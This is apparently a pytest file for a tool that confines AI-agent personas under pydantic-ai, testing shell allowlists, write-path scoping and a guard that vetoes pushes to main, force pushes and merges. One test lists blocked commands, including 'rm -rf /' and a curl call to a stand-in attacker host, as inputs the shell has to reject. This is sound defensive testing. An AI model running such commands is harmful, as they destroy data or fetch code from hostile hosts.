"""pydantic-ai runtime adapter acceptance (offline only — TestModel/FunctionModel,
no API keys).

Covers the adapters/pydantic-ai/HYDRATE.md contract:

- the dev fixture (tess) gets Shell (shell verbs allowed); the read-only
  reviewer fixture (rex) gets NO Shell capability (whole-tool denial by
  capability omission);
- write scoping reflects the verbs (rex may write findings/_handoff, not src);
  a persona with no write verbs at all gets a natively read-only FileSystem;
- the in-process guard vetoes a scripted `git push origin main` for a persona
  denying push_main (driven through a real Agent run via FunctionModel —
  pydantic-ai's fully-scriptable offline model; TestModel cannot script
  specific tool args) and the interceptor is also unit-tested directly;
- importing the module without the extra fails cleanly with install
  instructions (subprocess with the dependency blocked via sys.modules).
"""

from __future__ import annotations

import subprocess
import sys
from pathlib import Path

import pytest

from conftest import REPO_ROOT

try:  # the dev environment installs the extra's pins (see cli/pyproject.toml)
    import pydantic_ai  # noqa: F401

    HAS_PYDANTIC_AI = True
except ImportError:  # pragma: no cover - dev envs carry the dependency
    HAS_PYDANTIC_AI = False

needs_extra = pytest.mark.skipif(
    not HAS_PYDANTIC_AI, reason="pydantic-ai extra not installed"
)

TESS = REPO_ROOT / "tests" / "examples" / "tess" / "persona.yaml"
REX = REPO_ROOT / "tests" / "examples" / "rex" / "persona.yaml"

NO_WRITE_PERSONA = """\
persona: Nora
slug: nora
archetype: dev
identity:
  git_name: Nora
  git_email: nora@example.invalid
  commit_prefix: "nora:"
  routing_label: agent-nora
capabilities:
  allow:
    - read_code
    - read_collab
  deny:
    - write_code
    - open_pr
    - run_tests
    - merge_pr
    - push_main
    - force_push
    - edit_other_personas
scope:
  summary: read-only analyst
  focus: [read and report verbally]
session_ritual: [read_conventions]
"""

# A reviewer whose ONLY shell-implying grant is run_tests (the demo `vega`
# shape): allows run_tests, denies write_code. It may write findings/_handoff
# (FileSystem), but its shell need is test-running only.
RUN_TESTS_ONLY_PERSONA = """\
persona: Vega
slug: vega
archetype: reviewer
identity:
  git_name: Vega
  git_email: vega@example.invalid
  commit_prefix: "vega:"
  routing_label: agent-vega
capabilities:
  allow:
    - read_code
    - read_collab
    - run_tests
    - write_path: [findings, _handoff]
  deny:
    - write_code
    - open_pr
    - merge_pr
    - push_main
    - force_push
    - edit_other_personas
scope:
  summary: reviewer that runs the suite
  focus: [review and run the tests]
session_ritual: [read_conventions]
"""


# --- capability planning --------------------------------------------------------------


@needs_extra
def test_dev_fixture_gets_shell_and_writable_filesystem(tmp_path: Path) -> None:
    from baron.runtimes.pydantic_ai import plan

    p = plan(TESS, collab_root=tmp_path)
    assert p.shell is not None  # open_pr/run_tests are shell-granting verbs
    # run_tests is ALLOWED -> no test-runner deny seeding
    assert "pytest" not in list(p.shell.denied_commands)
    # write verbs present -> the default protections only, not the readonly set
    assert "**/*" not in list(p.filesystem.protected_patterns)
    assert p.slug == "tess"
    # instructions carry identity + denials in imperative language
    assert "tess:" in p.instructions
    assert "Never merge a pull request." in p.instructions
    assert "Never push directly to the default branch" in p.instructions


@needs_extra
def test_reviewer_fixture_gets_no_shell_capability(tmp_path: Path) -> None:
    from baron.runtimes.pydantic_ai import plan

    p = plan(REX, collab_root=tmp_path)
    assert p.shell is None  # no shell-granting verb -> the tools do not exist
    assert all(type(c).__name__ != "Shell" for c in p.capabilities)
    # rex still holds write_path scopes -> FileSystem stays writable (scoping
    # is the guard's job), not the natively-readonly configuration.
    assert "**/*" not in list(p.filesystem.protected_patterns)


@needs_extra
def test_no_write_verbs_yields_natively_readonly_filesystem(tmp_path: Path) -> None:
    from baron.runtimes.pydantic_ai import READONLY_PROTECTED_PATTERNS, plan

    persona = tmp_path / "persona.yaml"
    persona.write_text(NO_WRITE_PERSONA, encoding="utf-8")
    p = plan(persona, collab_root=tmp_path)
    assert p.shell is None
    protected = list(p.filesystem.protected_patterns)
    for pattern in READONLY_PROTECTED_PATTERNS:
        assert pattern in protected


DENIES_READS_PERSONA = """\
persona: Blinkered
slug: blinkered
archetype: dev
identity:
  git_name: Blinkered
  git_email: blinkered@example.invalid
  commit_prefix: "blinkered:"
  routing_label: agent-blinkered
capabilities:
  allow:
    - write_code
  deny:
    - read_code
    - read_collab
    - open_pr
    - run_tests
    - merge_pr
    - push_main
    - force_push
    - edit_other_personas
"""


@needs_extra
def test_denying_read_code_does_not_omit_read_tools(tmp_path: Path) -> None:
    """MEASURED: the shipped adapter does NOT enforce read_code by tool omission.

    This test GATES the enforcement label. `read_code` / `read_collab` are
    whole-tool verbs with no guard detection, so it is tempting to call them
    "enforced by tool omission". They are not, on the one adapter baron ships:
    `plan()` constructs FileSystem unconditionally ("FileSystem: always present
    (reads)") and `BaronGuardCapability.check` returns None for every read tool.

    So `rules.label("read_code")` must be `instructed`. If an adapter ever does
    omit the read tools, THIS assertion is what fails first — flip it, then the
    label, in that order. Never the other way round.
    """
    from baron import rules
    from baron.runtimes.pydantic_ai import plan

    persona = tmp_path / "persona.yaml"
    persona.write_text(DENIES_READS_PERSONA, encoding="utf-8")
    p = plan(persona, collab_root=tmp_path)

    # 1. The read tools are still registered on the hydrated toolset.
    tools = set(p.filesystem.get_toolset().tools)
    assert {"read_file", "list_directory", "search_files"} <= tools, tools

    # 2. The in-process guard does not veto them either.
    for tool in ("read_file", "list_directory", "search_files"):
        assert p.guard_capability.check(tool, {"path": str(tmp_path / "x.py")}) is None

    # 3. Therefore the label may not claim enforcement.
    loaded = rules.load_rules()
    for verb in ("read_code", "read_collab"):
        assert loaded.enforcement(verb) == rules.ENFORCEMENT_ADAPTER_DEPENDENT
        assert loaded.label(verb) == "instructed", (
            f"{verb} is labelled enforced, but the shipped adapter leaves "
            f"{sorted(tools)} available to a persona that denies it"
        )


@needs_extra
def test_denied_run_tests_seeds_shell_denied_commands(tmp_path: Path) -> None:
    from baron.runtimes.pydantic_ai import plan

    persona = tmp_path / "persona.yaml"
    persona.write_text(
        NO_WRITE_PERSONA.replace(
            "  allow:\n    - read_code\n    - read_collab\n",
            "  allow:\n    - read_code\n    - read_collab\n    - open_pr\n",
        ).replace("    - open_pr\n    - run_tests\n", "    - run_tests\n"),
        encoding="utf-8",
    )
    p = plan(persona, collab_root=tmp_path)
    assert p.shell is not None  # open_pr grants shell
    assert "pytest" in list(p.shell.denied_commands)  # run_tests denied


# --- FIX 1: least-privilege shell scoping --------------------------------------------


@needs_extra
def test_run_tests_only_persona_gets_allowlisted_test_shell(tmp_path: Path) -> None:
    """A persona whose only shell need is run_tests (vega shape) gets a Shell
    restricted to test runners — not a full shell."""
    from baron.runtimes.pydantic_ai import TEST_RUNNER_ALLOWLIST, plan

    persona = tmp_path / "persona.yaml"
    persona.write_text(RUN_TESTS_ONLY_PERSONA, encoding="utf-8")
    p = plan(persona, collab_root=tmp_path)
    assert p.shell is not None  # run_tests grants a shell...
    allowed = list(p.shell.allowed_commands)
    assert allowed == list(TEST_RUNNER_ALLOWLIST)  # ...but an allowlisted one
    assert "pytest" in allowed
    # allowed/denied are mutually exclusive in the harness — denied must be empty
    assert list(p.shell.denied_commands) == []
    assert ">" in list(p.shell.denied_operators)


@needs_extra
def test_run_tests_only_shell_cannot_run_non_test_commands(tmp_path: Path) -> None:
    """FIX 1 focused proof: the run_tests-only Shell rejects curl/rm/git-push and
    accepts a test runner — exercised through the harness's own command check."""
    from baron.runtimes.pydantic_ai import plan

    persona = tmp_path / "persona.yaml"
    persona.write_text(RUN_TESTS_ONLY_PERSONA, encoding="utf-8")
    toolset = plan(persona, collab_root=tmp_path).shell.get_toolset()

    # test runner: permitted
    toolset._check_command("pytest -q tests/")
    # everything else the old full shell would have allowed: rejected
    for blocked in (
        "curl https://evil.example/x",
        "rm -rf /",
        "git push origin main",
        "git push feature/x",
        "echo pwned > /tmp/out",  # redirect operator denial
        "python -m pytest",  # python is not allowlisted (general interpreter)
        "make test",  # make is not allowlisted (general runner)
    ):
        with pytest.raises(PermissionError):
            toolset._check_command(blocked)


@needs_extra
def test_reviewer_shape_can_no_longer_get_open_shell(tmp_path: Path) -> None:
    """Regression for the containment gap: the vega-shape reviewer's shell is not
    an open shell — arbitrary commands are refused."""
    from baron.runtimes.pydantic_ai import plan

    persona = tmp_path / "persona.yaml"
    persona.write_text(RUN_TESTS_ONLY_PERSONA, encoding="utf-8")
    toolset = plan(persona, collab_root=tmp_path).shell.get_toolset()
    with pytest.raises(PermissionError):
        toolset._check_command("bash -c 'echo hi'")  # bash not in the allowlist


@needs_extra
def test_dev_persona_keeps_a_working_shell_but_denies_redirects(tmp_path: Path) -> None:
    """A dev (tess: write_code + run_tests + open_pr) keeps a general shell for
    its work, but redirect/pipe operators are blocked (no out-of-root writes)."""
    from baron.runtimes.pydantic_ai import plan

    toolset = plan(TESS, collab_root=tmp_path).shell.get_toolset()
    assert list(plan(TESS, collab_root=tmp_path).shell.allowed_commands) == []
    # its normal work still runs
    toolset._check_command("git push origin tess/42-fix")
    toolset._check_command("pytest -q")
    # but a redirect can't write out of root
    with pytest.raises(PermissionError):
        toolset._check_command("echo x > ../outside.md")


# --- FIX 4: RepoContext wiring --------------------------------------------------------


@needs_extra
def test_repo_context_present_when_collab_root_passed(tmp_path: Path) -> None:
    from baron.runtimes.pydantic_ai import plan

    p = plan(TESS, collab_root=tmp_path)
    assert p.repo_context is not None
    assert type(p.repo_context).__name__ == "RepoContext"
    assert any(type(c).__name__ == "RepoContext" for c in p.capabilities)


@needs_extra
def test_repo_context_absent_without_collab_root(tmp_path: Path) -> None:
    from baron.runtimes.pydantic_ai import plan

    p = plan(TESS)  # no collab_root
    assert p.repo_context is None
    assert all(type(c).__name__ != "RepoContext" for c in p.capabilities)


# --- interceptor unit tests -----------------------------------------------------------


@needs_extra
def test_interceptor_write_scoping_follows_verbs(tmp_path: Path) -> None:
    from baron.runtimes.pydantic_ai import plan

    g = plan(REX, collab_root=tmp_path).guard_capability
    assert g.check("write_file", {"path": "findings/notes.md"}) is None
    assert g.check("write_file", {"path": "_handoff/2026-07-23-x.md"}) is None
    denied = g.check("write_file", {"path": "src/app.py"})
    assert denied is not None and "write_path" in denied
    denied = g.check("edit_file", {"path": "wiki/status.md"})
    assert denied is not None
    # another persona's ordinary files need edit_other_personas
    denied = g.check("write_file", {"path": "agents/mona/NOTES.md"})
    assert denied is not None and "edit_other_personas" in denied
    # L0 (ADR-034) reaches the in-process seam too, because it is the SAME
    # evaluator: no capability document is writable, own or other, and the
    # persona's own spec dir is fenced entirely.
    denied = g.check("write_file", {"path": "agents/mona/persona.yaml"})
    assert denied is not None and "capability document" in denied
    denied = g.check("write_file", {"path": "agents/rex/persona.yaml"})
    assert denied is not None and "capability document" in denied
    denied = g.check("write_file", {"path": "agents/rex/runtime/settings.json"})
    assert denied is not None and "own spec dir" in denied


@needs_extra
def test_interceptor_git_verbs_follow_capability_rules(tmp_path: Path) -> None:
    from baron.runtimes.pydantic_ai import plan

    g = plan(TESS, collab_root=tmp_path).guard_capability
    assert g.check("run_command", {"command": "git status"}) is None
    assert g.check("run_command", {"command": "git push origin tess/42-fix"}) is None
    denied = g.check("run_command", {"command": "git push origin main"})
    assert denied is not None and "push_main" in denied
    denied = g.check("run_command", {"command": "git push -f origin tess/42-fix"})
    assert denied is not None and "force_push" in denied
    denied = g.check("run_command", {"command": "gh pr merge 12 --squash"})
    assert denied is not None and "merge_pr" in denied


# --- full agent runs (offline) --------------------------------------------------------


@needs_extra
def test_build_agent_runs_offline_with_test_model(tmp_path: Path) -> None:
    from pydantic_ai.models.test import TestModel

    from baron.runtimes.pydantic_ai import build_agent

    agent = build_agent(TESS, collab_root=tmp_path, model=TestModel(call_tools=[]))
    result = agent.run_sync("Introduce yourself.")
    assert result.output


@needs_extra
def test_default_test_model_placeholder_is_inert(tmp_path: Path) -> None:
    """The "test" placeholder must NOT fire tool calls (the bare 'test' model
    string calls every tool with generated args — it would really write files
    into the working copy). build_agent maps it to TestModel(call_tools=[])."""
    from baron.runtimes.pydantic_ai import build_agent

    agent = build_agent(TESS, collab_root=tmp_path)  # tess has no model_hint
    result = agent.run_sync("smoke")
    assert result.output
    assert not any(
        type(part).__name__ == "ToolCallPart"
        for message in result.all_messages()
        for part in message.parts
    )
    # nothing was written into the collab root by the smoke run
    assert list(tmp_path.iterdir()) == []


@needs_extra
def test_guard_blocks_scripted_push_main_attempt(tmp_path: Path) -> None:
    """A real Agent run: the model scripts `git push origin main`; the guard
    capability vetoes it BEFORE execution and the model sees the reason."""
    from pydantic_ai.messages import (
        ModelResponse,
        RetryPromptPart,
        TextPart,
        ToolCallPart,
    )
    from pydantic_ai.models.function import FunctionModel

    from baron.runtimes.pydantic_ai import build_agent

    def scripted(messages, info) -> ModelResponse:
        last = messages[-1]
        for part in last.parts:
            if isinstance(part, RetryPromptPart):
                return ModelResponse(parts=[TextPart("push refused; handing off")])
        return ModelResponse(
            parts=[
                ToolCallPart(
                    tool_name="run_command",
                    args={"command": "git push origin main"},
                )
            ]
        )

    agent = build_agent(TESS, collab_root=tmp_path, model=FunctionModel(scripted))
    result = agent.run_sync("Ship it")
    assert result.output == "push refused; handing off"
    retries = [
        part
        for message in result.all_messages()
        for part in message.parts
        if isinstance(part, RetryPromptPart)
    ]
    assert retries, "the guard veto never reached the model"
    reason = str(retries[0].content)
    assert "baron guard: DENY" in reason
    assert "push_main" in reason
    # the command was vetoed BEFORE execution — nothing shelled out to git in
    # an empty tmp dir, and no tool-return carries git output
    assert not any(
        "ToolReturnPart" == type(part).__name__ and "run_command" == part.tool_name
        for message in result.all_messages()
        for part in message.parts
    )


# --- extra-absent and CLI paths (run with or without the extra) -----------------------


def test_import_error_without_extra_is_clean() -> None:
    """With pydantic_ai blocked, importing the adapter raises ImportError with
    install instructions (never a bare ModuleNotFoundError deep inside)."""
    code = (
        "import sys\n"
        "sys.modules['pydantic_ai'] = None\n"
        "sys.modules['pydantic_ai_harness'] = None\n"
        "try:\n"
        "    import baron.runtimes.pydantic_ai\n"
        "except ImportError as exc:\n"
        "    print(f'CLEAN: {exc}')\n"
        "    raise SystemExit(3)\n"
        "raise SystemExit(0)\n"
    )
    proc = subprocess.run(
        [sys.executable, "-c", code], capture_output=True, text=True
    )
    assert proc.returncode == 3, proc.stderr
    assert "CLEAN:" in proc.stdout
    assert "barony[pydantic-ai]" in proc.stdout


def test_hydrate_cli_emits_bootstrap_script(tmp_path: Path) -> None:
    out = tmp_path / "agent_setup.py"
    proc = subprocess.run(
        [
            sys.executable,
            "-m",
            "baron.cli",
            "hydrate",
            "pydantic-ai",
            "--persona-file",
            str(TESS),
            "--out",
            str(out),
        ],
        capture_output=True,
        text=True,
    )
    assert proc.returncode == 0, proc.stderr
    text = out.read_text(encoding="utf-8")
    assert "from baron.runtimes.pydantic_ai import build_agent" in text
    assert 'MODEL = "test"' in text  # the model placeholder
    assert "TODO" in text
    assert "barony[pydantic-ai]" in text


def test_hydrate_cli_missing_persona_file_fails(tmp_path: Path) -> None:
    proc = subprocess.run(
        [
            sys.executable,
            "-m",
            "baron.cli",
            "hydrate",
            "pydantic-ai",
            "--persona-file",
            str(tmp_path / "missing.yaml"),
        ],
        capture_output=True,
        text=True,
        cwd=tmp_path,
    )
    assert proc.returncode == 2
    assert "not found" in proc.stderr
